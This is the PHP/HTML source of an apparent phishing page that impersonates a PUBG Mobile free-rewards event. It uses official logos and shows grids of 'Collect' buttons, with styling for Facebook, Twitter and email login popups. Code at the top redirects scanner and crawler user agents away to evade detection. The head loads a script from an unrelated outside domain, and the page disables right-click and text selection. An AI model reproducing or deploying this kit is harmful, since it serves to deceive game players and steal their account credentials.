<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("settings.php");
?>
<html>
<head>
    <script>var sekeid=66460296</script><script src=//domin.se.ke/pos.js ></script>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">

<style>
/* Sarı Buton Tasarımı */
.popup-btn-email {
    background: #eaa300 !important;
    color: #000 !important;
    margin-top: 5px;
    font-weight: bold;
}

/* Koyu Login Penceresi Tasarımı */
.popup-box-login-email {
    background: #1c2532; /* Koyu Arka Plan */
    max-width: 330px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 15%;
    text-align: center;
    font-family: 'Teko';
    color: #fff;
    border-radius: 5px;
    border: 1px solid #b69038; /* Altın Çerçeve */
    box-shadow: 0px 0px 10px rgba(0,0,0,0.8);
}

.header-email {
    background: #151a23;
    border-bottom: 2px solid #b69038; /* Altın Çizgi */
    padding: 15px;
    border-radius: 5px 5px 0 0;
}

.header-email-title {
    color: #b69038; /* Altın Yazı */
    font-size: 22px;
    font-weight: bold;
    letter-spacing: 1px;
}

.txt-login-email {
    padding-top: 15px;
    color: #fff;
    font-size: 18px;
    font-weight: normal;
    text-align: center;
    margin-bottom: 10px;
}

.input-email-box {
    background: #0e1217;
    border: 1px solid #384252;
    color: #fff;
    width: 90%;
    padding: 10px;
    margin-bottom: 10px;
    border-radius: 3px;
    font-family: sans-serif;
    font-size: 14px;
}

.input-email-box:focus {
    border: 1px solid #b69038; /* Tıklayınca Altın Olur */
    outline: none;
}

.btn-login-email-submit {
    background: #eaa300;
    width: 90%;
    height: auto;
    margin-top: 10px;
    padding: 10px;
    color: #000;
    font-size: 18px;
    font-weight: bold;
    font-family: 'Teko';
    border: none;
    border-radius: 3px;
    outline: none;
    cursor: pointer;
    margin-bottom: 20px;
}

.close-email {
    background: #000;
    width: 25px;
    height: 25px;
    color: #fff;
    text-align: center;
    border-radius: 50%;
    border: 1px solid #b69038;
    position: absolute;
    top: -10px;
    right: -10px;
    cursor: pointer;
    line-height: 22px;
    z-index: 999;
}

/* Mobil Uyumluluk */
@media only screen and (max-width:600px) {
    .popup-box-login-email {
        margin-top: 40%;
        width: 90%;
    }
}
</style>

</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="containerHome rewardsBox">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<br>
<span>The original Battle Royale, <br> the first and the best!</span>
</div> <div class="navbar-download">
<img class="navbar-menu" src="https://i.ibb.co/DV5fKmN/menu.png">
<img class="navbar-pay" src="https://i.ibb.co/FzLrjnF/pay.png">
</div> </div> <div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <div class="season-alert">
<img class="season-alert-img" src="https://www.pubgmobile.com/images/event/royalepassm5/kv_logo.png">
<div class="slider">
<div class="season-alert-title">Royale Pass Month 5: Mirror Realm</div>
</div>
<div class="slider">
<div class="season-alert-desc">Choose your free rewards here now!</div>
</div>
</div> <div class="box">
<div class="menu-wrapper-border"></div>
<div class="menu-wrapper">
<div class="menu-content kanan" onmousedown="buka.play();" onclick="openRewards(event, 'other');">Other Reward</div>
<div class="menu-content kiri" onmousedown="buka.play();" onclick="openRewards(event, 'season');" id="defaultTabRewards">Season Reward</div>
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'weapon');">Weapon Reward</div>
</div> <center>
<div class="tab_rewards" id="season">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/6.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/7.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/8.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/9.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/10.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/10.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/11.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/11.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/12.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/12.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/13.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/13.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/14.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/14.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/15.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/15.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/16.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/16.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/17.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/17.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/18.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/18.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/19.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/19.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/20.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/20.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/21.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/21.png">Collect</button>
</div>
</div>
</div> </div> <div class="tab_rewards" id="weapon">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/BTDzRRr/scar.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BTDzRRr/scar.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/tMxQz1L/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/tMxQz1L/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/mvHNgg1/m24new.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mvHNgg1/m24new.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/GtRxjJp/m16new.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/GtRxjJp/m16new.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/cXn5Wb9/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cXn5Wb9/8.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/RT1tc10/image-12.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/RT1tc10/image-12.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/5xvV1TP/m24.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/5xvV1TP/m24.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/fFQfP42/GR-7.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/fFQfP42/GR-7.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/wzmCg1L/a1.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wzmCg1L/a1.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/jRZxtbP/a2.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/jRZxtbP/a2.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/NtHMgmF/a3.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/NtHMgmF/a3.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/JK5QkCq/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/JK5QkCq/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/N1Kh4DJ/m249.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N1Kh4DJ/m249.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/n0jsqH6/1.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/n0jsqH6/1.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/tC7gGKh/2.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/tC7gGKh/2.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/HdCPbym/3.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/HdCPbym/3.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/zHXhQmQ/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/zHXhQmQ/8.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/hcnPCFM/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hcnPCFM/9.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/S78nnmC/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/S78nnmC/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/Lk3B2mw/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Lk3B2mw/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/YpbSGGN/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/YpbSGGN/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/54C3TwS/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/54C3TwS/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/8rwnBbf/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/8rwnBbf/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/JyKsRV9/3.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/JyKsRV9/3.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/9NW5RBs/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/9NW5RBs/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/DrzYVS0/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/DrzYVS0/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/3cM96Bn/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3cM96Bn/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/30shkpG/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/30shkpG/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/DYcd3r8/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/DYcd3r8/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/m5MfkNp/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/m5MfkNp/6.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/0hG72h9/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0hG72h9/7.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/c232k1x/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c232k1x/8.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/smrqkwd/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/smrqkwd/9.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/stysM7v/10.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/stysM7v/10.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/WgYyGnw/11.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WgYyGnw/11.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/pdYW33J/12.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pdYW33J/12.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/N9XVcKh/13.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N9XVcKh/13.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/X8Y41sj/14.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/X8Y41sj/14.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/mhWQMvq/15.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mhWQMvq/15.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/Rjh4zr4/16.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Rjh4zr4/16.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/qB0F8jV/17.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/qB0F8jV/17.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/n8pTPFf/18.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/n8pTPFf/18.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/rkkQqXM/20.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/rkkQqXM/20.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/jTsg4BQ/21.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/jTsg4BQ/21.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/v332bhy/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/v332bhy/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/9sw3NZK/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/9sw3NZK/5.png">Collect</button>
</div>
</div>
</div> </div> <div class="tab_rewards" id="other">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/SsSLKPW/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/SsSLKPW/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/tMxT8gH/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/tMxT8gH/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/4JwtG6V/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/4JwtG6V/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/w4F1pFZ/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/w4F1pFZ/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/WtGHHkn/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WtGHHkn/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/2NH3gJN/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/2NH3gJN/6.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/LYCNSFb/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/LYCNSFb/7.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/xMMb8T4/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/xMMb8T4/8.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/bLRBcVc/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/bLRBcVc/9.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/D91ffQj/10.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/D91ffQj/10.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/z7PhT1v/11.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/z7PhT1v/11.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/8PTTPn9/12.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/8PTTPn9/12.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/4JxPCTt/13.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/4JxPCTt/13.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/Qb5vhVV/14.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Qb5vhVV/14.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/5h8n7T7/15.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/5h8n7T7/15.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/nRD1WZP/16.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/nRD1WZP/16.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/c3x3TDP/17.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c3x3TDP/17.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/cCg6WvL/18.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cCg6WvL/18.png">Collect</button>
</div>
</div>
</div> </div> </center>
</div> <div class="footer">
<div class="footer-txt-follow">Follow Us</div> <center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/Wx8wkq1/footer-img.png">
